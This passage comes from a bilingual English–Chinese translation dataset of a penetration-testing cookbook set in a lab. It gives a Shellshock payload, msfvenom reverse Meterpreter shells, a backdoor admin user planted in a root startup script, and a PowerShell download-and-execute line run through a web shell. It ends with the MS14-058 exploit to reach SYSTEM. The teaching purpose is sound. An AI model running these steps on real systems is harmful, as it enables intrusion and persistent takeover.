  zh: '![](assets/5b54ca2c-b228-4ada-9ccf-0c922020a878.png)'
- en: 'With the file in the server, we exploit Shellshock again to execute it: `()
    { :;}; echo "Vulnerable:" $(/tmp/cute_dolphin.bin")`.'
  id: totrans-100
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在服务器中存在文件后，我们再次利用 Shellshock 来执行它：`() { :;}; echo "Vulnerable:" $(/tmp/cute_dolphin.bin")`。
- en: 'If everything goes right, we should see a connection being received in our
    Metasploit''s listener, as illustrated as follows:'
  id: totrans-101
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果一切顺利，我们应该能够在 Metasploit 的监听器中看到一个连接，如下所示：
- en: '![](assets/12914c45-d1cc-4f15-8e7f-be0b06c2eebb.png)'
  id: totrans-102
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/12914c45-d1cc-4f15-8e7f-be0b06c2eebb.png)'
- en: 'Once the session is established, we can use the `help` command to see the functionality
    of meterpreter and start to run commands on the compromised server:'
  id: totrans-103
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦会话建立，我们可以使用 `help` 命令查看 meterpreter 的功能，并开始在受损服务器上运行命令：
- en: '![](assets/9d5c4b08-eb31-454f-99d2-401b10dbd301.png)'
  id: totrans-104
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/9d5c4b08-eb31-454f-99d2-401b10dbd301.png)'
- en: How it works...
  id: totrans-105
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的...
- en: '`msfvenom` helps us create payloads from the extensive list of Metasploit''s
    payloads, and incorporates them into source code in many languages, or creates
    scripts and executable files, as we did in this recipe. The parameters we used
    here were the payload to use (`linux/x86/meterpreter/reverse_tcp`), the host and
    port to connect back `(lhost` and `lport`), and the output format `(-f elf`),
    redirecting the standard output to a file to have it saved as `cute_dolphin.bin`.'
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: '`msfvenom` 帮助我们从 Metasploit 广泛的有效载荷列表中创建有效载荷，并将其集成到多种编程语言的源代码中，或者创建脚本和可执行文件，正如我们在本教程中所做的那样。我们在这里使用的参数是：要使用的有效载荷（`linux/x86/meterpreter/reverse_tcp`），回连的主机和端口（`lhost`
    和 `lport`），以及输出格式 `(-f elf)`，将标准输出重定向到文件并保存为 `cute_dolphin.bin`。'
- en: The `exploit/multi/handler` module of Metasploit is a payload handler. This
    means it doesn't actually perform any exploitation; instead it only processes
    connections with payloads executed in compromised hosts. In this case, we used
    it to listen for the connection and after the connection was established, it ran
    the meterpreter payload.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 的 `exploit/multi/handler` 模块是一个有效载荷处理程序。这意味着它并不实际执行任何攻击；它仅仅处理与在受损主机上执行的有效载荷的连接。在这种情况下，我们使用它来监听连接，并在连接建立后，它运行了
    meterpreter 有效载荷。
- en: Meterpreter is Metasploit's version of a shell on steroids. Although meterpreter
    for Linux is more limited than its Windows counterpart, which contains modules
    to sniff on a victim's network and to perform privilege escalation and password
    extraction, we can still use it as a pivot point to access the victim's local
    network, or to exploit the host further by using the local and post-exploitation
    Metasploit modules.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter 是 Metasploit 版本的超级 Shell。尽管 Linux 上的 meterpreter 比 Windows 版本更有限，后者包含了嗅探受害者网络和执行权限提升与密码提取的模块，但我们仍然可以将其作为一个支点，访问受害者的本地网络，或者通过使用本地和后期利用的
    Metasploit 模块进一步攻击主机。
- en: Privilege escalation on Linux
  id: totrans-109
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Linux 上的权限提升
- en: For some penetration testing projects, getting a web-shell may be enough in
    terms of exploitation and demonstration of the impact of a vulnerability. In some
    other cases, we may need to go beyond that to expand our level of privilege within
    that server or to use it to pivot to other hosts in the network.
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 对于某些渗透测试项目，获取一个 Web Shell 可能在攻击和展示漏洞影响方面已经足够。在其他情况下，我们可能需要进一步提升在该服务器上的权限，或者利用该权限转向网络中的其他主机。
- en: In this first recipe about privilege escalation, we will draw on the previous
    recipe where we uploaded and executed a reverse shell to our attacking machine
    and use tools included in Kali Linux to gain administrative access on the server.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 在这第一篇关于权限提升的教程中，我们将借鉴之前的教程，其中我们上传并执行了一个反向 Shell 到攻击机器，并使用 Kali Linux 中的工具在服务器上获取管理员访问权限。
- en: Getting ready
  id: totrans-112
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: It is recommended that the previous two recipes, *Executing commands by exploiting
    Shellshock* and *Creating and capturing a reverse shell with Metasploit*, be completed
    before starting this one, although it is possible to achieve the same results
    from any limited shell on a remote server.
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 建议在开始本教程之前先完成前两个教程，*利用 Shellshock 执行命令* 和 *使用 Metasploit 创建并捕获反向 Shell*，尽管从任何受限的
    Shell 在远程服务器上也能实现相同的结果。
- en: How to do it...
  id: totrans-114
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'We have a meterpreter shell running on a compromised server—more specifically,
    bee-box with the IP `192.168.56.12`. Let''s start by finding a way to escalate
    privileges:'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在一台受损服务器上运行了一个 meterpreter Shell——更具体地说，是在 IP 为 `192.168.56.12` 的 bee-box
    上。我们从找到提升权限的方法开始：
- en: Kali Linux includes a tool called `unix-privesc-check`; it checks the system
    for configuration vulnerabilities that may allow us to escalate privileges. From
    a meterpreter shell, we can use the upload command to upload it to the server.
    In your meterpreter session, issue the `upload /usr/bin/unix-privesc-check /tmp/` command.
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Kali Linux包含一个名为`unix-privesc-check`的工具；它检查系统中可能允许我们提升权限的配置漏洞。从meterpreter shell中，我们可以使用`upload`命令将其上传到服务器。在meterpreter会话中，输入`upload
    /usr/bin/unix-privesc-check /tmp/`命令。
- en: 'Once the file is uploaded, open a system shell (using the `shell` command in
    meterpreter) and run the script with `/tmp/unix-privesc-check standard`. The following
    screenshot shows the process:'
  id: totrans-117
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦文件上传完成，打开系统shell（在meterpreter中使用`shell`命令），并运行脚本`/tmp/unix-privesc-check standard`。以下截图展示了这一过程：
- en: '![](assets/2c4da87f-b3a8-4e7b-b00c-b8eb2f5ae8c7.png)'
  id: totrans-118
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/2c4da87f-b3a8-4e7b-b00c-b8eb2f5ae8c7.png)'
- en: 'The script will show a long list of results, but we are interested in the one
    that shows `WARNING` at the beginning. In the following screenshot, we can see
    that there is a script (`/etc/init.d/bwapp_movie_search`) which is run by root
    at startup and everyone can write to it (`World write is set`):'
  id: totrans-119
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 脚本会显示一长串结果，但我们关注的是在开头显示`WARNING`的那一项。以下截图中，我们可以看到有一个脚本(`/etc/init.d/bwapp_movie_search`)，它在启动时由root用户运行，并且任何人都可以写入它（`World
    write is set`）：
- en: '![](assets/5b4b8a21-716e-4044-8409-7a52235a93e7.png)'
  id: totrans-120
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/5b4b8a21-716e-4044-8409-7a52235a93e7.png)'
- en: We will use that file to make the root user execute commands at startup. We
    will make it create a user with administrative privileges so we can connect through
    SSH to the the server at any time. To do so, we need to check the groups existing
    in the system so we can have an idea of which have privileged access. In the system
    shell, run the `cat /etc/group|sort -u` command. You will see that there are some
    interesting names such as `adm`, `admin`, and `root`.
  id: totrans-121
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们将利用这个文件让root用户在启动时执行命令。我们会让它创建一个具有管理员权限的用户，这样我们就可以随时通过SSH连接到服务器。为了实现这一点，我们需要检查系统中已有的用户组，以便了解哪些具有特权访问权限。在系统shell中，运行`cat
    /etc/group|sort -u`命令。你会看到一些有趣的组名，比如`adm`、`admin`和`root`。
- en: 'As we don''t have a full shell, we cannot open a text editor to add our commands
    to the target file, so we will need to append them line by line to the file using
    `echo`:'
  id: totrans-122
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于我们没有完整的shell，我们无法打开文本编辑器来将命令添加到目标文件中，因此我们需要通过`echo`命令逐行将它们附加到文件中：
- en: '[PRE6]'
  id: totrans-123
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'To verify that the commands were introduced properly, use `tail`. It will show
    the last lines of the file: `tail /etc/init.d/bwapp_movie_search`. In the screenshot,
    we can see what it should look like:'
  id: totrans-124
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了验证命令是否正确引入，使用`tail`。它将显示文件的最后几行：`tail /etc/init.d/bwapp_movie_search`。在截图中，我们可以看到它应该是什么样子：
- en: '![](assets/08a13fda-a7cf-4fb5-8b4d-9cb8bb4c7e2e.png)'
  id: totrans-125
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/08a13fda-a7cf-4fb5-8b4d-9cb8bb4c7e2e.png)'
- en: As this server is part of our testing lab, we can just restart it. In a real-world
    scenario, an attacker could attempt an attack to cause the server to restart,
    or a DoS to force the administrators to reboot it.
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 由于该服务器是我们测试实验室的一部分，我们可以直接重启它。在实际场景中，攻击者可能会尝试发动攻击导致服务器重启，或者发动DoS攻击迫使管理员重启服务器。
- en: Once the server is restarted, use ssh in your Kali Linux to log in to `ssh hacker@192.168.56.12`
    and then the password you set in *step 5*. If asked about accepting the certificate
    of the host, type `yes` and press *Enter*.
  id: totrans-127
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 服务器重启后，使用Kali Linux中的ssh登录到`ssh hacker@192.168.56.12`，然后输入你在*第5步*中设置的密码。如果询问是否接受主机证书，输入`yes`并按*Enter*。
- en: 'If everything went correctly, you will be able to log in. The following screenshot
    shows that the user has root access to all commands because they belong to group
    admin (`sudo -l`) and can impersonate the root user (`sudo su`):'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果一切顺利，你将能够登录。以下截图显示该用户拥有对所有命令的root访问权限，因为他们属于admin组（`sudo -l`），并且可以以root用户身份进行身份验证（`sudo
    su`）：
- en: '![](assets/4a50a68d-8406-44c0-a35d-53640f28a505.png)'
  id: totrans-129
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/4a50a68d-8406-44c0-a35d-53640f28a505.png)'
- en: How it works...
  id: totrans-130
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 它是如何工作的……
- en: In this recipe, we used an existing meterpreter shell to upload a script to
    the compromised server. `unix-privesc-check` is a shell script that automatically
    looks for certain configurations, characteristics, and parameters in the system
    that may allow a limited user to access resources which they are not authorized
    for, such as files belonging to other users or programs that are run under higher
    privilege profiles. We ran `unix-privesc-check` with the standard parameter, which
    makes only a basic set of tests; there is also the detailed option that takes
    longer but also performs a deeper analysis and can give us more escalation alternatives.
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个操作步骤中，我们使用了一个现有的 meterpreter shell 将脚本上传到被攻击的服务器。`unix-privesc-check` 是一个
    shell 脚本，它会自动查找系统中某些配置、特征和参数，这些配置可能允许一个有限权限的用户访问他们无权访问的资源，例如属于其他用户的文件或以更高权限运行的程序。我们使用标准参数运行了
    `unix-privesc-check`，这仅进行了一些基础的测试；也有一个详细选项，它会花费更长时间，但会进行更深入的分析，能为我们提供更多的权限提升选项。
- en: After analyzing the results of `unix-privesc-check`, we decided to modify a
    script that is run with high privileges at boot time and added two commands to
    it. The first one was to create a user belonging to the groups `admin`, `adm`,
    and `root`, and the other was to set a password for such a user. To add those
    commands to the file, we used the `echo` command and the output redirection operator
    (`>`), as our limited shell won't allow us to open a text editor and directly
    edit the file. Then we restarted the virtual machine.
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 在分析了 `unix-privesc-check` 的结果后，我们决定修改一个在启动时以高权限运行的脚本，并向其中添加了两个命令。第一个是创建一个属于
    `admin`、`adm` 和 `root` 组的用户，另一个是为该用户设置密码。为了将这些命令添加到文件中，我们使用了 `echo` 命令和输出重定向操作符（`>`），因为我们受限的
    shell 不允许我们打开文本编辑器直接编辑文件。然后我们重启了虚拟机。
- en: Before making any changes to a target system, always make sure that those changes
    are not going to disrupt any service and back up the files before altering anything.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 在对目标系统进行任何更改之前，请确保这些更改不会中断任何服务，并在进行更改之前备份文件。
- en: When the machine rebooted, we connected to it via SSH using the user we set
    up to create and verify that it actually had root privileges. It is also a good
    idea to remove the lines we added to the `/etc/init.d/bwapp_movie_search` script
    to avoid triggering further alerts.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 当机器重启后，我们通过 SSH 连接到它，使用我们设置的用户进行创建并验证其是否具有 root 权限。最好也将我们添加到 `/etc/init.d/bwapp_movie_search`
    脚本中的行删除，以避免触发进一步的警报。
- en: See also
  id: totrans-135
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 另请参见
- en: We decided to use the modification of a file that is executed with root privileges
    at startup as our way of gaining administrative access. There are other options
    that may not require the attacker to wait for the server to be restarted, although
    altering startup scripts may be a way to retain persistent access, especially
    if such alterations are done in obscure functions within the scripts that are
    rarely looked into by administrators and developers.
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 我们决定使用一个在启动时以 root 权限执行的文件修改作为获得管理员访问权限的方式。虽然有其他选项可能不需要攻击者等待服务器重启，但修改启动脚本可能是保持持续访问的一种方法，特别是当这些修改发生在脚本中的不常被管理员和开发人员查看的模糊函数时。
- en: 'Other common aspects to look for when trying to escalate privileges in Unix-based
    systems are the following:'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 在尝试提升 Unix 系统权限时，以下是一些常见的方面需要注意：
- en: '**SUID bit**: When this bit is set in the properties of a program or script,
    such a program will be executed under the privileges of the owner user, not under
    those of the user executing it. For example, if an executable file belongs to
    the root user (the owner is the first name shown when we do `ls -l` over a file)
    and is executed by user `www-data`, the system will treat that program as being
    executed by root. So, if we find a file like that and manage to alter the files
    that it opens or uses, we may be able to gain root execution.'
  id: totrans-138
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**SUID 位**：当程序或脚本的属性中设置了该位时，该程序将以所有者用户的权限执行，而不是以执行者的权限执行。例如，如果一个可执行文件属于 root
    用户（当我们对文件执行 `ls -l` 时显示的第一个名称为所有者），并且由 `www-data` 用户执行，系统会将该程序视为由 root 执行。因此，如果我们发现这样一个文件并成功修改它所打开或使用的文件，我们可能能够获得
    root 执行权限。'
- en: '**PATH and other environment variables**: When programs call other programs
    or read system files, they need to specify their names and locations within the
    system; sometimes these programs only specify the name and relative paths. Also,
    the operating system has some precedence criteria regarding where to look first
    when an absolute path is not specified—for example, to look first in the current
    folder, in the program''s location, or in those specified in the PATH environment
    variable. These two conditions open the door for an attacker to add a malicious
    file with the same name as the one required by a privileged program, in a location
    that will be looked at by the operating system before the actual location of the
    file, forcing the vulnerable program to process the contents of the attacker''s
    file instead of the legitimate one.'
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**PATH和其他环境变量**：当程序调用其他程序或读取系统文件时，它们需要指定其名称和在系统中的位置；有时这些程序只指定名称和相对路径。此外，操作系统在没有指定绝对路径时，具有某些优先级标准——例如，首先在当前文件夹中查找、程序所在位置，或在PATH环境变量中指定的路径中查找。这两个条件为攻击者提供了机会，可以在操作系统首先查找的路径中添加一个恶意文件，这个文件与需要的特权程序文件同名，迫使易受攻击的程序处理攻击者的文件内容，而不是合法的文件。'
- en: '**Exploits for known vulnerabilities**: In real-world organizations, Unix-based
    systems are often the least frequently patched and updated. This gives attackers
    and penetration testers the opportunity to look for publicly available exploits
    that will allow them to take advantage of vulnerabilities existing in out-of-date
    software.'
  id: totrans-140
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**已知漏洞的利用**：在实际的组织中，基于Unix的系统通常是最不频繁打补丁和更新的。这使得攻击者和渗透测试人员有机会寻找公开可用的漏洞利用工具，从而利用过时软件中的漏洞。'
- en: Privilege escalation on Windows
  id: totrans-141
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Windows上的权限提升
- en: In this author's experience, Windows-based web servers have a considerable market
    share in business environments, and for internal web applications they may be
    more than 60% in a typical organization, adding to this the clear dominance of
    Microsoft SQL Server in the database market. This means that as penetration testers,
    we will surely face the situation where we manage to get command execution on
    a Windows server and need to gain administrative access in order to further exploit
    the network.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 根据本作者的经验，基于Windows的Web服务器在商业环境中具有相当大的市场份额，对于内部Web应用程序，它们在典型组织中的占比可能超过60%，再加上微软SQL
    Server在数据库市场的明显主导地位。这意味着作为渗透测试人员，我们必然会遇到这种情况：成功地在Windows服务器上执行命令并需要获得管理员访问权限，以进一步利用网络。
- en: In this recipe, we will start from a limited web-shell on a Windows server and
    use publicly available exploits to gain system access, the highest local privilege
    level in Windows.
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们将从Windows服务器上的一个有限Web shell开始，使用公开可用的漏洞利用工具获取系统访问权限，达到Windows的最高本地权限级别。
- en: Getting ready
  id: totrans-144
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 准备工作
- en: In this recipe, we will assume we already have a limited shell ([https://github.com/tennc/web-shell/blob/master/fuzzdb-web-shell/asp/cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx))
    on a Windows 2008 R2 server. We will be using a Windows virtual machine, as downloaded
    from Microsoft's download center at [https://www.microsoft.com/en-us/download/details.aspx?id=2227](https://www.microsoft.com/en-us/download/details.aspx?id=2227).
    The only change made is the addition of the Web Server Administrator role and
    configuring it to support ASP.Net applications. To enable ASP.Net, after installing
    the Web Server Administrator role, run `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis
    –i` from a command Terminal.
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 在本教程中，我们假设我们已经在Windows 2008 R2服务器上获得了一个有限的shell（[https://github.com/tennc/web-shell/blob/master/fuzzdb-web-shell/asp/cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)）。我们将使用从微软下载中心下载的Windows虚拟机，[https://www.microsoft.com/en-us/download/details.aspx?id=2227](https://www.microsoft.com/en-us/download/details.aspx?id=2227)。唯一的变化是添加了Web服务器管理员角色，并配置其支持ASP.Net应用程序。要启用ASP.Net，在安装Web服务器管理员角色后，打开命令终端并运行`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis
    –i`。
- en: How to do it...
  id: totrans-146
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 如何操作...
- en: 'So, we managed to upload our web-shell to a Windows web server. It is located
    at `http://192.168.56.14/cmd.aspx`. The first thing to do is to figure out which
    privilege level the web server is running:'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，我们成功地将我们的Web shell上传到了一个Windows Web服务器。它位于`http://192.168.56.14/cmd.aspx`。首先要做的是确定Web服务器正在运行的权限级别：
- en: 'Browse to the web-shell (`http://192.168.56.14/cmd.aspx`) and run the `whoami`
    command, as shown:'
  id: totrans-148
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 浏览到Web shell（`http://192.168.56.14/cmd.aspx`）并运行`whoami`命令，如下所示：
- en: '![](assets/82dfbcd2-de2e-4dcd-b747-8531bfba01e6.png)'
  id: totrans-149
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/82dfbcd2-de2e-4dcd-b747-8531bfba01e6.png)'
- en: As you can see, our user is `defaultapppool`, from the `iis apppool` group,
    which is a very limited one in its default configuration.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，我们的用户是`defaultapppool`，来自`iis apppool`组，这是一个在默认配置下权限非常有限的组。
- en: 'Next, we need to improve our method of issuing commands. Let''s use `msfvenom`
    to create a reverse meterpreter shell. We will use the server''s own PowerShell
    to execute our payload in memory, without it ever touching the target''s disk,
    making it difficult for antivirus and other protection software to detect it.
    To do that, our payload should be in PowerShell script format (`-f psh`) and we
    will save it directly to Kali''s web root folder (`-o /var/www/html/cutedolphin.ps1`),
    shown as follows:'
  id: totrans-151
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们需要改进发出命令的方法。让我们使用`msfvenom`创建一个反向meterpreter shell。我们将使用服务器自身的PowerShell在内存中执行我们的有效载荷，而不让它接触目标的硬盘，这样就很难被防病毒软件和其他保护软件检测到。为此，我们的有效载荷应该是PowerShell脚本格式（`-f
    psh`），并将其直接保存到Kali的Web根目录（`-o /var/www/html/cutedolphin.ps1`），如下所示：
- en: '![](assets/84ee4751-c37c-4784-b88d-c95982bef5f4.png)'
  id: totrans-152
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/84ee4751-c37c-4784-b88d-c95982bef5f4.png)'
- en: 'Once the payload is created, be sure that Kali''s web server is running so
    the target can download the script: `service apache2 start`.'
  id: totrans-153
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦创建了有效载荷，确保Kali的Web服务器正在运行，以便目标可以下载脚本：`service apache2 start`。
- en: 'Now create a `handler` for the meterpreter connection. Open `msfconsole` in
    a Terminal and execute the following to adjust the parameters as per the payload:'
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在为meterpreter连接创建一个`handler`。在终端中打开`msfconsole`并执行以下命令，根据有效载荷调整参数：
- en: '[PRE7]'
  id: totrans-155
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'The handler configuration should look like the following screenshot. Check
    everything is correct and execute the handler (`run`); it will open the configured
    port and wait for a connection:'
  id: totrans-156
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 处理程序配置应该像以下截图一样。检查一切是否正确，然后执行处理程序（`run`）；它将打开配置的端口并等待连接：
- en: '![](assets/cf6970c9-3909-40d4-90c7-4dd3e182ad37.png)'
  id: totrans-157
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/cf6970c9-3909-40d4-90c7-4dd3e182ad37.png)'
- en: 'Once we have the handler running, we need to execute the payload in the server.
    To do so, go to the web-shell and set the Program to `powershell.exe` and the
    Arguments to `-noexit -c iex ((New-Object Net.WebClient).DownloadString(''http://192.168.56.10/cutedolphin.ps1''))`
    and click Run:'
  id: totrans-158
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 一旦处理程序运行，我们需要在服务器上执行有效载荷。为此，请进入Web-shell，将程序设置为`powershell.exe`，参数设置为`-noexit
    -c iex ((New-Object Net.WebClient).DownloadString('http://192.168.56.10/cutedolphin.ps1'))`，然后点击运行：
- en: '![](assets/e124d692-dcf9-4aa7-9bc0-302a0d254eef.png)'
  id: totrans-159
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/e124d692-dcf9-4aa7-9bc0-302a0d254eef.png)'
- en: 'If the payload is correctly executed and the connection received, we will see
    our handler start a meterpreter session. Take note of the number assigned to the
    session, `1` in this case:'
  id: totrans-160
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果有效载荷成功执行并接收到连接，我们将看到我们的处理程序启动一个meterpreter会话。请注意会话分配的编号，此例中为`1`：
- en: '![](assets/1dbc4cc1-f960-4a50-b51c-c300a0b1382d.png)'
  id: totrans-161
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/1dbc4cc1-f960-4a50-b51c-c300a0b1382d.png)'
- en: 'When running meterpreter on Windows hosts, we can use the `getsystem` command
    to easily escalate to System if the configuration allows it. As the following
    screenshot shows, it is not possible in this case; we also tried to dump the local
    password hashes but it didn''t work. So we get the system information to look
    for a way to escalate privileges:'
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 当在Windows主机上运行meterpreter时，如果配置允许，我们可以使用`getsystem`命令轻松提升为System。正如以下截图所示，这在此情况下不可行；我们还尝试了转储本地密码哈希，但没有成功。因此，我们获取系统信息，寻找提升权限的方法：
- en: '![](assets/faf8b7ae-0da5-4679-9cd8-6068e89353d5.png)'
  id: totrans-163
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/faf8b7ae-0da5-4679-9cd8-6068e89353d5.png)'
- en: Use the `background` command to return to the Metasploit console and keep the
    meterpreter session running in the background.
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用`background`命令返回Metasploit控制台，并将meterpreter会话保持在后台运行。
- en: 'We use the `searchsploit` command, and it shows very few exploits matching
    `2008 R2`. Only one of them is local, meaning it can be executed from an existing
    session, and if we try it, it won''t work because our target is already patched:'
  id: totrans-165
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们使用`searchsploit`命令，它显示与`2008 R2`匹配的漏洞非常少。只有一个是本地的，意味着它可以在现有会话中执行，如果我们尝试，它将无法工作，因为我们的目标已经打过补丁：
- en: '![](assets/11826a66-d030-4e31-9ff9-26d84b2592a1.png)'
  id: totrans-166
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/11826a66-d030-4e31-9ff9-26d84b2592a1.png)'
- en: 'But we know it is very unlikely that there are only six exploits for Windows
    2008 R2 in Exploit-DB. As demonstrated in the screenshot, if we use grep (`grep
    "2008 R2" /usr/share/exploitdb/windows/local/*`) to look inside the exploits''
    text, we will find more:'
  id: totrans-167
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 但我们知道在Exploit-DB中，Windows 2008 R2的漏洞不可能只有六个。如截图所示，如果我们使用`grep`（`grep "2008 R2"
    /usr/share/exploitdb/windows/local/*`）查看漏洞文本，我们会发现更多：
- en: '![](assets/d005b5af-2bb3-486f-aa67-d919686ba955.png)'
  id: totrans-168
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d005b5af-2bb3-486f-aa67-d919686ba955.png)'
- en: 'Now we need to select one exploit that works for our configuration. A somewhat
    efficient way of doing that is using the `head` command to look at the first lines
    of each candidate. For example, in the screenshot, we look at the first 20 lines
    of exploit number `40410` and we can see it exploits some software called `Zortam
    Mp3 Media Studio`, which is unlikely to be installed in our target. So we check
    another:'
  id: totrans-169
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们需要选择一个适合我们配置的漏洞。一种相对高效的方法是使用 `head` 命令查看每个候选漏洞的前几行。例如，在截图中，我们查看漏洞编号为 `40410`
    的前 20 行，可以看到它利用了一款名为 `Zortam Mp3 Media Studio` 的软件，而这个软件不太可能安装在我们的目标系统中。所以我们检查另一个漏洞：
- en: '![](assets/ebb893fa-9d79-4f3b-8dd9-8a75238afc9d.png)'
  id: totrans-170
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/ebb893fa-9d79-4f3b-8dd9-8a75238afc9d.png)'
- en: 'We keep looking until we find exploit number `35101`, which exploits an internal
    Windows component and says it has been proven to work in our target system. It
    is also a Metasploit module, so we may find it in `msfconsole` and use our existing
    meterpreter session to trigger it. The next screenshot shows some key points:'
  id: totrans-171
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们继续查找，直到找到漏洞编号为 `35101` 的漏洞，它利用了一个 Windows 内部组件，并且已经证明在我们的目标系统上有效。它也是一个 Metasploit
    模块，因此我们可以在 `msfconsole` 中找到它，并使用我们现有的 Meterpreter 会话来触发它。接下来的截图展示了一些关键点：
- en: '![](assets/c9de7d18-30de-48b6-bfb6-d93eda5eb378.png)'
  id: totrans-172
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/c9de7d18-30de-48b6-bfb6-d93eda5eb378.png)'
- en: 'Open `msfconsole` and search for `TrackPopupMenu`, part of the exploit''s name.
    The one we are looking for is the one from 2014, `windows/local/ms14_058_track_popup_menu`:'
  id: totrans-173
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开 `msfconsole`，搜索 `TrackPopupMenu`，这是漏洞名称的一部分。我们要找的是 2014 年的那个，`windows/local/ms14_058_track_popup_menu`：
- en: '![](assets/05e4d1c7-3687-42e1-bb20-febd2dcd41fd.png)'
  id: totrans-174
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/05e4d1c7-3687-42e1-bb20-febd2dcd41fd.png)'
- en: 'Load and configure the module as shown below:'
  id: totrans-175
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如下所示，加载并配置模块：
- en: '[PRE8]'
  id: totrans-176
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'The final exploit configuration should look like this:'
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 最终的漏洞配置应该如下所示：
- en: '![](assets/57802ab6-8d7c-4d28-8f3d-1e54cf459558.png)'
  id: totrans-178
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/57802ab6-8d7c-4d28-8f3d-1e54cf459558.png)'
- en: 'Run the exploit and see how it retrieves a new meterpreter session:'
  id: totrans-179
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行漏洞并查看它如何获取新的 Meterpreter 会话：
- en: '![](assets/e0f96743-7a38-4f80-89cb-3672b0c648e2.png)'
  id: totrans-180
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/e0f96743-7a38-4f80-89cb-3672b0c648e2.png)'
- en: 'From this new session, we can verify it is running as a system (`getuid`).
